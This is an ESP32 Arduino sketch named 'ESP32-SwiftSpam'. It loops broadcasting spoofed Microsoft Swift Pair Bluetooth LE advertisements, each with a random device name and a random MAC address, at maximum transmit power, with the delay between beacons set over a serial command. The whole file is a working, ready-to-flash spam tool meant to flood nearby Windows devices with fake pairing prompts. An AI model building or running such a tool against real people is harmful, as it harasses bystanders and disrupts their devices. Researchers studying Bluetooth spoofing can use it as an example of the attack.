// ESP32-SwiftSpam
// Author: Kyhze
// Version: 1.0.0
// Date: 25/01/2025

#include <NimBLEDevice.h>

const char* ver = "1.0.0";

// Function to generate a random device name
String generateRandomDeviceName() {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/()=[]{}@!?.;,:/*$%+\\#<>";
    const int nameLength = 12; // Length of the random name
    char name[nameLength + 1];

    for (int i = 0; i < nameLength; i++) {
        name[i] = charset[random(sizeof(charset) - 1)];
    }
    name[nameLength] = '\0'; // Null-terminate the string

    return String(name);
}

// Function to generate a random MAC address
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256); // Generate a random byte for each part of the MAC
    }
    mac[0] &= 0xFE; // Ensure the MAC is unicast (LSB of the first byte is 0)
    mac[0] |= 0x02; // Ensure the MAC is locally administered (second LSB of the first byte is 1)
}

// Function to generate SwiftPair advertisement data
NimBLEAdvertisementData generateSwiftPairAdvertisementData(const String& deviceName) {
    NimBLEAdvertisementData advertisementData;

    // Generate the raw advertisement data
    uint8_t nameLen = deviceName.length();
    uint8_t advDataLen = 7 + nameLen; // BLE payload length
    uint8_t* advDataRaw = new uint8_t[advDataLen];

    int i = 0;
    advDataRaw[i++] = advDataLen - 1; // Length of this block
    advDataRaw[i++] = 0xFF;           // Manufacturer Specific Data type
    advDataRaw[i++] = 0x06;           // Microsoft Vendor ID (LSB)
    advDataRaw[i++] = 0x00;           // Microsoft Vendor ID (MSB)
    advDataRaw[i++] = 0x03;           // Beacon ID (3 = Microsoft-specific ID)
    advDataRaw[i++] = 0x00;           // Flags (0x00) - Microsoft Beacon Sub Scenario
    advDataRaw[i++] = 0x80;           // Flags (0x80) - Reserved RSSI Byte
    memcpy(&advDataRaw[i], deviceName.c_str(), nameLen); // Copy the device name
    i += nameLen;

    // Add the raw advertisement data
    advertisementData.addData(advDataRaw, advDataLen);

    // Clean up
    delete[] advDataRaw;

    return advertisementData;
}

// Spam delay parameters
// Usual behavior: Quickest discovery = 30ms ; Normal cadence: 100-152.5ms
const unsigned short MIN_DELAY = 10;    // Minimum delay in milliseconds
const unsigned short MAX_DELAY = 1000;  // Maximum delay in milliseconds
unsigned short currentDelay = 130;      // Default delay in milliseconds

void setup() {
    // Initialize serial console
    Serial.begin(115200);
    Serial.printf("\nESP32-SwiftSpam ver.: %s\n", ver);
    Serial.println("\n[>>] Starting ESP32-SwiftSpam...");
    Serial.println("Use 'set delay <10-1000>' to change the delay (ms).");
    Serial.printf("\n[+] Spam delay set to: %lums\n", currentDelay);

    // Set the initial random seed
    randomSeed(analogRead(0));
}

void loop() {
    // Check if there is data available on the serial port
    if (Serial.available() > 0) {
      String input = Serial.readStringUntil('\n'); // Read the incoming data
      input.trim(); // Remove any extra whitespace or newline characters

      // Check if the input starts with "set delay"
      if (input.startsWith("set delay ")) {
        // Extract the delay value from the command
        String delayValueStr = input.substring(10); // "set delay " is 10 characters long
        unsigned long newDelay = delayValueStr.toInt(); // Convert to integer

        // Validate the new delay value
        if (newDelay >= MIN_DELAY && newDelay <= MAX_DELAY) {
          currentDelay = newDelay; // Update the delay value
          Serial.printf("\n[+] New spam delay set to: %lums\n", currentDelay);
        } else {
          Serial.println("\n[-] Invalid delay value. Please enter a value between 10 and 1000 (ms).");
        }
      } else {
        Serial.println("\n[-] Invalid command. Use 'set delay <10-1000>' to change the delay (ms).");
      }
    }

    // Generate a random device name
    String deviceName = generateRandomDeviceName();

    // Generate a random MAC address
    uint8_t mac[6];
    generateRandomMac(mac);

    // Initialize BLE
    NimBLEDevice::init("");
    NimBLEDevice::setPower(9); // Set to max TX power (ranges from -12dbm to 9dbm - Tested on ESP32-WROOM-32)

    // Set the random MAC address
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setOwnAddr(mac);

    // Create BLE server
    NimBLEServer *pServer = NimBLEDevice::createServer();

    // Get advertising object
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    // Generate SwiftPair advertisement data with the random device name and appearance
    NimBLEAdvertisementData advertisementData = generateSwiftPairAdvertisementData(deviceName);

    // Set advertisement data
    pAdvertising->setAdvertisementData(advertisementData);

    // Start advertising
    pAdvertising->start();

    // Wait for set delay (in ms) before sending the next beacon
    delay(currentDelay);

    // Stop advertising to reset for the next beacon
    pAdvertising->stop();

    // Clean up the server and advertising objects
    NimBLEDevice::deinit();
}
